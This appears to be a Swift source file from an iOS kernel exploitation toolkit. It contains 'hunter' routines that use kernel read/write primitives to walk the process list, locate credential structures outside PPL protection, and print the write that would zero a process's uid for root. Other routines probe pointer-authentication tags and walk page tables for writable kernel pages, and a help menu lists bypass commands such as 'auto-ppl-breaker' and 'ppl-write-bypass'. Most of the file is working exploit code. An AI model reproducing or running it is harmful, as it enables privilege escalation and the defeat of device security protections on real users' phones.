                let ucred = raw_ucred & 0x0000000FFFFFFFFF
                if ucred != 0 {
                    report.append(_hunterPTEWalker(targetVA: ucred, label: "ucred"))
                    report.append("")
                }
            }
        }

        let kbase = ds_get_kernel_base()
        if kbase != 0 {
            report.append(_hunterPTEWalker(targetVA: kbase + 0x1000, label: "kernel_text+0x1000"))
            report.append("")
        }

        report.append("═══════════════════════════════════════════════════════════════")
        report.append("  HUNT COMPLETE — review targets above for manual exploitation")
        report.append("═══════════════════════════════════════════════════════════════")

        return .ok(report.joined(separator: "\n"))
    }
}

private func _hunterZoneScan() -> String {
    let our_proc = ds_get_our_proc(); guard our_proc != 0 else {
        return "═══ Hunter 1: Zone Scanner — ds_get_our_proc() = 0 — abort"
    }
    guard off_proc_p_list_le_next > 0, off_proc_p_proc_ro > 0, off_proc_p_pid > 0 else {
        return "═══ Hunter 1: Zone Scanner — required offsets not resolved — abort"
    }

    var lines: [String] = []
    lines.append("═══ Hunter 1: Zone Scanner (allproc walk) ═══")

    var proc = our_proc
    var seen = 0
    var nonPPLTargets: [(pid: Int32, proc: UInt64, proc_ro: UInt64, ucred: UInt64, uid: UInt32)] = []

    while proc != 0 && _isNonPPL(proc) && seen < 512 {
        seen += 1

        let raw_proc_ro = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
        let proc_ro = raw_proc_ro & 0x0000000FFFFFFFFF
        let pid = Int32(ds_kread32(proc + UInt64(off_proc_p_pid)))

        var ucred: UInt64 = 0
        var uid: UInt32 = 0xFFFFFFFF
        if proc_ro != 0 && off_proc_ro_p_ucred > 0 {
            let raw_ucred = ds_kread64(proc_ro + UInt64(off_proc_ro_p_ucred))
            ucred = raw_ucred & 0x0000000FFFFFFFFF
            if ucred != 0 && _isNonPPL(ucred) {
                uid = ds_kread32(ucred + 0x18)
            }
        }

        let roNonPPL = _isNonPPL(proc_ro)
        let ucNonPPL = _isNonPPL(ucred)

        if roNonPPL || ucNonPPL {
            nonPPLTargets.append((pid, proc, proc_ro, ucred, uid))
            lines.append(String(format:
                "  [TARGET] pid=%-5d proc=0x%012llx proc_ro=0x%012llx[%@] ucred=0x%012llx[%@] uid=%u",
                pid, proc, proc_ro, roNonPPL ? "NON-PPL" : "PPL",
                ucred, ucNonPPL ? "NON-PPL" : "PPL", uid))
        }

        let next_raw = ds_kread64(proc + UInt64(off_proc_p_list_le_next))
        let next = next_raw & 0x0000000FFFFFFFFF
        if next == proc || next == 0 { break }
        proc = next
    }

    lines.append(String(format: "  Scanned %d procs, found %d with non-PPL structs", seen, nonPPLTargets.count))

    if nonPPLTargets.isEmpty {
        lines.append("  [FAIL] No non-PPL proc_ro or ucred found in allproc")
        lines.append("  → All credentials are PPL-protected on this build")
    } else {
        lines.append("")
        lines.append("  EXPLOITABLE TARGETS (non-PPL ucred = direct patch viable):")
        for t in nonPPLTargets where _isNonPPL(t.ucred) {
            lines.append(String(format:
                "    pid=%d uid=%u ucred=0x%llx → ds_kwrite32(0x%llx+0x18, 0)",
                t.pid, t.uid, t.ucred, t.ucred))
        }
    }

    return lines.joined(separator: "\n")
}

private func _hunterForkProbe() -> String {
    var lines: [String] = []
    lines.append("═══ Hunter 2: Fork Probe (fresh ucred allocation) ═══")

    let our_proc = ds_get_our_proc()
    guard our_proc != 0 else { return lines.joined(separator: "\n") + "\n  ds_get_our_proc() = 0" }
    guard off_proc_p_proc_ro > 0, off_proc_ro_p_ucred > 0 else {
        return lines.joined(separator: "\n") + "\n  required offsets not resolved"
    }

    // fork() unavailable in Swift on iOS — using current process as diagnostic proxy
    let child_pid = getpid()
    let child_proc = our_proc

    let raw_ro = ds_kread64(child_proc + UInt64(off_proc_p_proc_ro))
    let child_ro = raw_ro & 0x0000000FFFFFFFFF
    let raw_uc = child_ro != 0 ? ds_kread64(child_ro + UInt64(off_proc_ro_p_ucred)) : 0
    let child_ucred = raw_uc & 0x0000000FFFFFFFFF

    let roZone = _isNonPPL(child_ro) ? "NON-PPL" : (_isPPLZone(child_ro) ? "PPL" : "UNKNOWN")
    let ucZone = _isNonPPL(child_ucred) ? "NON-PPL" : (_isPPLZone(child_ucred) ? "PPL" : "UNKNOWN")

    lines.append(String(format: "  current pid=%d proc=0x%012llx (fork() unavailable on iOS)", child_pid, child_proc))
    lines.append(String(format: "  current proc_ro=0x%012llx [%@]", child_ro, roZone))
    lines.append(String(format: "  current ucred =0x%012llx [%@]", child_ucred, ucZone))

    if _isNonPPL(child_ucred) {
        lines.append("  CURRENT UCRED IN NON-PPL ZONE — direct patch viable")
        let orig_uid = ds_kread32(child_ucred + 0x18)
        lines.append(String(format: "  cr_uid = %u (test with: ds_kwrite32(0x%llx+0x18, 0))", orig_uid, child_ucred))
    } else {
        lines.append("  Current ucred in PPL zone — fork trick ineffective on this build")
    }

    return lines.joined(separator: "\n")
}

private func _hunterPACCollision() -> String {
    var lines: [String] = []
    lines.append("═══ Hunter 3: PAC Collision Probe ═══")

    let our_proc = ds_get_our_proc()
    guard our_proc != 0 else { return lines.joined(separator: "\n") + "\n  ds_get_our_proc() = 0" }

    var samples: [UInt64] = []

    let raw_proc_ro = ds_kread64(our_proc + UInt64(off_proc_p_proc_ro))
    if raw_proc_ro != 0 { samples.append(raw_proc_ro) }

    let task = ds_get_our_task()
    if task != 0 && off_task_map > 0 {
        let raw_map = ds_kread64(task + UInt64(off_task_map))
        if raw_map != 0 { samples.append(raw_map) }
    }

    let kbase = ds_get_kernel_base()
    for i in 0..<10 {
        let addr = kbase + 0x800_0000 + UInt64(i * 0x800)
        if ds_isvalid(addr) {
            let v = ds_kread64(addr)
            if v != 0 && v != 0xFFFFFFFFFFFFFFFF { samples.append(v) }
        }
    }

    if task != 0 {
        for i in 0..<10 {
            let addr = task + 0x100 + UInt64(i * 8)
            if ds_isvalid(addr) {
                let v = ds_kread64(addr)
                if v != 0 && v != 0xFFFFFFFFFFFFFFFF { samples.append(v) }
            }
        }
    }

    lines.append(String(format: "  Collected %d PAC-tagged samples", samples.count))
    guard samples.count >= 2 else {
        return lines.joined(separator: "\n") + "\n  insufficient samples for analysis"
    }

    let vaMask: UInt64 = (1 << 39) - 1
    var tagCounts: [UInt64: Int] = [:]
    var tagToPtrs: [UInt64: [UInt64]] = [:]

    for ptr in samples {
        let tag = ptr & ~vaMask
        tagCounts[tag, default: 0] += 1
        tagToPtrs[tag, default: []].append(ptr)
    }

    var collisions = 0
    for (tag, count) in tagCounts {
        if count > 1 && tag != 0 {
            collisions += 1
            let ptrs = tagToPtrs[tag]!
            lines.append(String(format: "  [WARN] COLLISION: tag=0x%016llx appears %d times", tag, count))
            for p in ptrs {
                lines.append(String(format: "    ptr=0x%016llx → stripped=0x%016llx", p, p & 0x0000000FFFFFFFFF))
            }
        }
    }

    if collisions == 0 {
        lines.append("  [OK] No PAC tag collisions detected (strong key)")
    }

    var freq = [Int](repeating: 0, count: 256)
    for ptr in samples {
        let byte = UInt8((ptr >> 40) & 0xFF)
        freq[Int(byte)] += 1
    }
    var entropy: Double = 0
    let total = Double(samples.count)
    for f in freq where f > 0 {
        let p = Double(f) / total
        entropy -= p * log2(p)
    }
    lines.append(String(format: "  Tag entropy: %.3f bits (theoretical max=8.0)", entropy))
    lines.append(String(format: "  Assessment: %@",
        entropy > 7.5 ? "HIGH entropy — PAC key is strong" :
        entropy > 5.0 ? "MODERATE entropy — possible weakness" :
        "LOW entropy — PAC key may be predictable"))

    return lines.joined(separator: "\n")
}

private func _hunterPTEWalker(targetVA: UInt64, label: String) -> String {
    var lines: [String] = []
    lines.append(String(format: "═══ Hunter 4: PTE Walker (%@ @ 0x%012llx) ═══", label, targetVA))

    let ttep = pm_get_ttep()
    let physmapBase = pm_get_physmap_base()

    guard ttep != 0 && physmapBase != 0 else {
        lines.append("  pm_get_ttep() or pm_get_physmap_base() = 0 — cannot walk page tables")
        return lines.joined(separator: "\n")
    }

    lines.append(String(format: "  TTBR1_EL1 (TTEP)  = 0x%016llx", ttep))
    lines.append(String(format: "  physmap_base      = 0x%016llx", physmapBase))

    let l0idx = (targetVA >> 39) & 0x1FF
    let l1idx = (targetVA >> 30) & 0x1FF
    let l2idx = (targetVA >> 21) & 0x1FF
    let l3idx = (targetVA >> 12) & 0x1FF

    let l0eAddr = ttep + (l0idx * 8)
    let l0e = ds_kread64(l0eAddr)
    lines.append(String(format: "  L0[%3lld] @ 0x%012llx = 0x%016llx", l0idx, l0eAddr, l0e))
    guard (l0e & 1) != 0 else {
        lines.append("  [FAIL] L0 entry INVALID — translation fault")
        return lines.joined(separator: "\n")
    }

    let l1Phys = l0e & 0xFFFFFFFFF000
    let l1VA = physmapBase + l1Phys - 0x800000000
    let l1eAddr = l1VA + (l1idx * 8)
    let l1e = ds_kread64(l1eAddr)
    lines.append(String(format: "  L1[%3lld] @ 0x%012llx = 0x%016llx", l1idx, l1eAddr, l1e))
    guard (l1e & 1) != 0 else {
        lines.append("  [FAIL] L1 entry INVALID")
        return lines.joined(separator: "\n")
    }

    let l2Phys = l1e & 0xFFFFFFFFF000
    let l2VA = physmapBase + l2Phys - 0x800000000
    let l2eAddr = l2VA + (l2idx * 8)
    let l2e = ds_kread64(l2eAddr)
    lines.append(String(format: "  L2[%3lld] @ 0x%012llx = 0x%016llx", l2idx, l2eAddr, l2e))
    guard (l2e & 1) != 0 else {
        lines.append("  [FAIL] L2 entry INVALID")
        return lines.joined(separator: "\n")
    }

    let l3Phys = l2e & 0xFFFFFFFFF000
    let l3VA = physmapBase + l3Phys - 0x800000000
    let l3eAddr = l3VA + (l3idx * 8)
    let l3e = ds_kread64(l3eAddr)
    lines.append(String(format: "  L3[%3lld] @ 0x%012llx = 0x%016llx", l3idx, l3eAddr, l3e))

    guard (l3e & 1) != 0 else {
        lines.append("  [FAIL] L3 entry INVALID")
        return lines.joined(separator: "\n")
    }

    let apBits = (l3e >> 6) & 0x3
    let pxn = (l3e >> 53) & 1
    let uxn = (l3e >> 54) & 1
    let af = (l3e >> 10) & 1
    let sh = (l3e >> 8) & 0x3
    let attrIndx = (l3e >> 2) & 0x7
    let ns = (l3e >> 5) & 1
    let ng = (l3e >> 11) & 1

    let apDesc: String
    switch apBits {
    case 0: apDesc = "RW_EL1 (kernel RW)"
    case 1: apDesc = "RW_EL1/EL0 (both RW)"
    case 2: apDesc = "RO_EL1 (kernel RO)"
    case 3: apDesc = "RO_EL1/EL0 (both RO)"
    default: apDesc = "UNKNOWN"
    }

    lines.append(String(format:
        "  AP[2:1]=%lld (%@) PXN=%lld UXN=%lld AF=%lld SH=%lld ATTR=%lld NS=%lld NG=%lld",
        apBits, apDesc, pxn, uxn, af, sh, attrIndx, ns, ng))

    let pagePhys = l3e & 0xFFFFFFFFF000
    let pageVA = physmapBase + pagePhys - 0x800000000
    lines.append(String(format: "  Page physical = 0x%012llx  physmap VA = 0x%012llx", pagePhys, pageVA))

    let pplHeuristic = (attrIndx == 4 || attrIndx == 5) && apBits == 2
    if pplHeuristic {
        lines.append("  [WARN] PPL HEURISTIC TRIGGERED: ATTR=4/5 + RO — possible PPL page")
    }

    if apBits == 0 && pxn == 0 {
        lines.append("  [OK] PAGE IS RW+EXECUTABLE — full access (unlikely for PPL)")
    } else if apBits == 0 {
        lines.append("  [OK] PAGE IS RW — writable (bypass possible if no PPL bit)")
    } else if apBits == 2 {
        lines.append("  [FAIL] PAGE IS READ-ONLY — write will fault or be blocked")
    }

    return lines.joined(separator: "\n")
}

private func _regHelpPPL() {
    OmegaCore.register("help-ppl") { _, _ in
        .ok("""
help-ppl: PAC / KTRR / SMR / PPL Analysis (OmegaExtendedG)
─────────────────────────────────────────────────────────────────────────
  PAC — Pointer Authentication:
    pac-reader <va>                 Decode PAC-signed kernel pointer
    pac-signature-extractor <ptr>   Extract PAC tag from raw pointer
    pac-key-scanner [start] [end]   Scan kernel for PAC-signed ptrs
    pac-context-analyzer <ptr>      PACDA vs PACIA analysis
    pac-entropy-checker <va> [n]    Measure PAC signature entropy
    pac-algorithm-fingerprint       Identify PAC algorithm (QARMA)
    pac-strength-analyzer           Overall PAC protection score
    pac-coverage-mapper             PAC coverage of known structs
    pac-weak-key-detector <va> [n] [t]  Check for duplicate tags
    pac-null-pointer-checker <va>   Find null-PAC (PACIZA) ptrs
    pac-bypass-validator            Confirm bypass correctness

  KTRR — Kernel Text Region Read-only:
    ktrr-region-mapper              All KTRR-protected regions + PTE
    ktrr-boundary-finder            Exact KTRR start/end VA
    ktrr-permission-checker <addr>  AP bits + protection for addr
    ktrr-enforcement-detector       Is KTRR hardware-enforced?
    ktrr-bypass-paths-finder        RW windows via physmap

  SMR — Secure Memory Region:
    smr-region-scanner              Scan allproc for SMR ptrs
    smr-metadata-reader <ptr>       Decode SMR pointer + epoch
    smr-protection-level-analyzer   Epoch size + rotation policy
    smr-isolation-tester <ptr>      SMR boundary reachability

  PPL — Page Protection Layer:
    ppl-status                      Full PPL + privilege snapshot
    ppl-phase-report                OmegaPhysmap P1/P2/P3 results
    ppl-write-bypass <addr> <val>   physmap write attempt
    ppl-signature-forge             EXTRACT PAC tag + build fake proc_ro (read-only)
    ppl-protected-variable-read <a> Read + PPL zone check
    ppl-bypass-strategy-planner     Auto-recommend bypass path
    ppl-fuzzer <addr> [len]         Probe for writable windows
    ppl-version-comparison          PPL history across iOS versions
    auto-ppl-breaker                Run best bypass automatically
    comprehensive-ppl-tester        Full 7-check test battery

  PPL HUNTER — Multi-Vector Autonomous Scanner:
    ppl-hunter                      Run all 6 hunters (Zone, Fork, PAC, PTE×3)
                                    Reports exploitable targets + PTE layout
─────────────────────────────────────────────────────────────────────────
""")
    }
}
